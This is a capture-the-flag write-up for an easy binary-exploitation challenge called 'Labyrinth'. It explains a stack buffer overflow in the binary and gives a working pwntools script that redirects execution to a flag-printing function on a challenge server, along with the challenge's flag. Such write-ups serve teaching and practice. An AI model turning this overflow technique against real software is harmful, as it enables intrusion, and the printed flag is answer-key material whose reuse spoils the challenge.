# Challenge: Labyrinth (PWN)

## Challenge Overview

**Name:** Labyrinth  
**Category:** PWN  
**Difficulty:** Easy

### Description:

You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.

---

# Challenge Progress: Labyrinth (PWN)

## Exploit Steps

### Step 1: Analyze the Binary with `checksec`
Check the security features of the binary using the `checksec` command:
```bash
checksec --fortify-file=full --pie --relro --nx
````

This reveals the following:

* **Full RELRO**: The GOT (Global Offset Table) is read-only.
* **No Canary**: No stack protection is enabled.
* **NX (Non-eXecutable)**: Prevents execution of shellcode in certain areas.
* **No PIE (Position Independent Executable)**: The binary's memory address is static, meaning it's predictable and exploitable.

### Step 2: Load the Binary into Ghidra

Using **Ghidra**, a powerful reverse engineering tool, the binary is disassembled and analyzed. The main function in the program is examined to understand the flow. Specifically, the program asks the user to select a door, and if the input is `"69"` or `"069"`, it proceeds to another step where the input is stored in a buffer of size 16 bytes.

### Step 3: Identify the Buffer Overflow Vulnerability

In the `main()` function, after receiving the door input (`fgets`), the program proceeds to accept additional input (up to 68 bytes). This results in a **stack-based buffer overflow**, allowing an attacker to overwrite the return address and redirect the program flow.

### Step 4: Locate the `escape_plan()` Function

In the **escape\_plan()** function, the flag is printed by reading the contents of `flag.txt`. The address of this function is located using `objdump -d ./labyrinth | grep escape`.

### Step 5: Craft the Exploit Payload

The exploit payload is written using **Pwntools**, a library for binary exploitation in Python. The payload is designed to:

* Fill the buffer with `0x30` bytes of `'A'` to overflow the stack.
* Append the address of the `.bss` section, adjusted to point to where the flag is located.
* Append the address of the `escape_plan()` function to redirect execution.

### Step 6: Prepare the Python Exploit Script

Here is the Python script used to exploit the vulnerability:

```python
from pwn import *

exe = ELF("/home/kali/Downloads/labyrinth/labyrinth")
libc = ELF("/home/kali/Downloads/labyrinth/libc.so.6")
ld = ELF("/home/kali/Downloads/labyrinth/ld-linux-x86-64.so.2")

context.binary = exe

host = '94.237.52.170'
port = 56514
r = remote(host, port)
r.sendline(b'69')
addr = 0x0000000000401256  # Memory address of escape_plan function
payload = b'a' * 0x30 + p64(exe.bss() + 0x200) + p64(addr)  # Overflow and redirect

r.sendline(payload)
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

### Step 7: Run the Exploit

Execute the script with:

```bash
python3 exploit.py
```

### Expected Output

If successful, the script will display the flag:

```
[+] Opening connection to 94.237.52.170 on port 56514: Done
[+] Flag --> HTB{3sc4p3_fr0m_4b0v3}
```

May god with us~